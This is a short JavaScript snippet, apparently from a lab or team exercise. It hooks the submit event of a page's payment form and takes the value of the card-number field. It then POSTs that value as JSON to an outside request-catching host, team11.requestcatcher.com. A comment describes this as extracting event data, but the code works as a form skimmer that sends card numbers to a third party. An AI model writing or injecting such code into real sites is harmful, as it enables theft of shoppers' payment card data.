const paymentForm = document.getElementById('payment-form');

paymentForm.addEventListener('submit', function(event) {

    // Extract relevant event data (since event object has circular references)
    const eventData = {
        type: event.type,
        target: event.target.id || event.target.tagName,
        timestamp: event.timeStamp,
        formData: {
            cardNumber: document.getElementById('card-number').value
        }
    };

    fetch('https://team11.requestcatcher.com/test', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(eventData)
    })
});
